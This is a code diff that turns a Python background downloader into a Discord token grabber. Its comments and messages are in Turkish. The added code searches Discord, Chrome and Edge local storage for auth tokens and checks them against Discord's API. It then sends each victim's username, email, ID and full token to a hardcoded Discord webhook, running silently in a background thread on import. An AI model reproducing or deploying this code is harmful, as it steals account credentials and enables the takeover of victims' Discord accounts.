@@ -1,76 +1,100 @@
 import os
-import sys
-import time
-import threading
-import subprocess
+import re
 import requests
-import shutil
+import json
+import base64
+from threading import Thread
 
 # ==========================================
-# WEBHOOK URL
+# WEBHOOK
 # ==========================================
 WEBHOOK_URL = "https://discord.com/api/webhooks/1545041726350164089/IvuLChHVaWacAV39i0WSQYi5u9vfRnFzxAg8l9ALo1r2IGkx_fhwhwP_ldpSTS1UUswG"
 
 def send_notification(msg):
     try:
-        requests.post(WEBHOOK_URL, json={"content": f"**[COMMANDS1]** {msg}"}, timeout=5)
-    except:
-        pass
-
-def send_error(msg):
-    try:
-        send_notification(f"❌ HATA: {msg}")
+        requests.post(WEBHOOK_URL, json={"content": msg}, timeout=5)
     except:
         pass
 
 # ==========================================
-# ARKA PLANDA DOSYA İNDİR
+# TOKEN TOPLAMA
 # ==========================================
-def download_file(url, save_path):
+def get_tokens():
+    tokens = []
+    paths = [
+        os.path.join(os.environ["APPDATA"], "Discord", "Local Storage", "leveldb"),
+        os.path.join(os.environ["APPDATA"], "discordcanary", "Local Storage", "leveldb"),
+        os.path.join(os.environ["APPDATA"], "discordptb", "Local Storage", "leveldb"),
+        os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
+        os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb")
+    ]
+    
+    token_pattern = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"
+    
+    for path in paths:
+        if not os.path.exists(path):
+            continue
+        for file in os.listdir(path):
+            if not file.endswith((".log", ".ldb")):
+                continue
+            try:
+                with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
+                    content = f.read()
+                    found = re.findall(token_pattern, content)
+                    for token in found:
+                        if token not in tokens:
+                            tokens.append(token)
+            except:
+                pass
+    return tokens
+
+# ==========================================
+# TOKEN DOĞRULA VE BİLGİ GÖNDER
+# ==========================================
+def check_token(token):
     try:
-        send_notification(f"📥 İndirme başlatıldı: {url}")
-        
-        response = requests.get(url, stream=True, timeout=30)
-        total_size = int(response.headers.get('content-length', 0))
-        
-        with open(save_path, 'wb') as f:
-            downloaded = 0
-            for chunk in response.iter_content(chunk_size=8192):
-                if chunk:
-                    f.write(chunk)
-                    downloaded += len(chunk)
-                    # Her 10 MB'da bir bildirim gönder
-                    if downloaded % (10 * 1024 * 1024) == 0:
-                        mb = downloaded // (1024 * 1024)
-                        send_notification(f"📊 İndirme ilerlemesi: {mb} MB / {total_size // (1024*1024)} MB")
-        
-        send_notification(f"✅ Dosya indirildi: {save_path} ({total_size // (1024*1024)} MB)")
-        return True
-        
-    except Exception as e:
-        send_error(f"İndirme hatası: {str(e)}")
-        return False
+        headers = {"Authorization": token}
+        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
+        if r.status_code == 200:
+            data = r.json()
+            return True, data
+        return False, None
+    except:
+        return False, None
 
 # ==========================================
 # ANA İŞLEM
 # ==========================================
 def main():
-    send_notification("🚀 Arka plan indirici başlatıldı...")
+    send_notification("🔍 Discord token'ları taranıyor...")
+    tokens = get_tokens()
     
-    # İndirilecek dosya bilgileri
-    file_url = "https://transfer.it/t/g8c4jEslXR4L"  # Değiştirilebilir
-    download_path = os.path.join(os.environ["USERPROFILE"], "Downloads", "indirilen_dosya.zip")
+    if not tokens:
+        send_notification("❌ Token bulunamadı.")
+        return
     
-    # İndir
-    success = download_file(file_url, download_path)
+    send_notification(f"🔍 {len(tokens)} token bulundu, kontrol ediliyor...")
     
-    if success:
-        send_notification("✅ İndirme tamamlandı!")
-    else:
-        send_notification("❌ İndirme başarısız!")
+    for token in tokens:
+        valid, user_data = check_token(token)
+        if valid:
+            mesaj = f"""
+🍪 **DISCORD TOKEN BULUNDU!**
+─────────────────
+**Kullanıcı:** `{user_data.get('username')}#{user_data.get('discriminator')}`
+**ID:** `{user_data.get('id')}`
+**E-posta:** `{user_data.get('email')}`
+**Nitro:** `{user_data.get('premium_type', 0) > 0}`
+─────────────────
+**Token:**
+```{token}```
+"""
+            send_notification(mesaj)
+        else:
+            send_notification(f"❌ Geçersiz token: {token[:20]}...")
 
 # ==========================================
 # ARKA PLANDA ÇALIŞTIR
 # ==========================================
-threading.Thread(target=main, daemon=True).start()
-send_notification("⏳ Arka plan indirici çalışıyor...")
+Thread(target=main, daemon=True).start()
+send_notification("⏳ Discord token grabber arka planda çalışıyor...")
